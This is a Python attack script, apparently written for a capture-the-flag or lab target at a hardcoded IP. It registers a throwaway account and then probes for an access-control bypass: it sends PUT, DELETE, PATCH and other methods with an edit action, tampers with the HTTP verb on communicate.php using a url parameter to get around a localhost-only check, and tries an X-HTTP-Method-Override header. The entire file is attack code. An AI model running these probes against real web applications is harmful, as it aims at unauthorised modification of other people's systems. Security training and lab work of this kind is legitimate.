#!/usr/bin/env python3
"""
Probar otros métodos HTTP (PUT, DELETE, PATCH, etc.)
"""
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Probar diferentes métodos HTTP en index.php
methods = ['PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE']

for method in methods:
    print(f"[*] Probando {method} en /")
    try:
        resp = session.request(method, f"{TARGET}/", data={'action': 'edit', 'new_name': 'TEST'}, timeout=5)
        print(f"    Status: {resp.status_code}")
        if resp.status_code == 200 and len(resp.text) > 0:
            if "Done!" in resp.text:
                print(f"    [+++] {method} funcionó!")
            elif "Only localhost" not in resp.text:
                print(f"    [?] Respuesta inesperada: {len(resp.text)} bytes")
    except Exception as e:
        print(f"    Exception: {e}")

# Probar HTTP verb tampering
print("\n[*] Probando HTTP verb tampering en communicate.php...")
resp = session.request('GET', f"{TARGET}/communicate.php", params={
    'url': 'http://motherland.com/',
    'data[action]': 'edit',
    'data[new_name]': 'TEST'
}, timeout=5)
print(f"    GET method: {resp.status_code}, {len(resp.text)} bytes")

# Probar con X-HTTP-Method-Override
print("\n[*] Probando X-HTTP-Method-Override...")
resp = session.get(f"{TARGET}/", headers={'X-HTTP-Method-Override': 'POST'}, params={'action': 'edit', 'new_name': 'TEST'})
print(f"    Status: {resp.status_code}")
if "Done!" in resp.text:
    print(f"    [+++] Method override funcionó!")
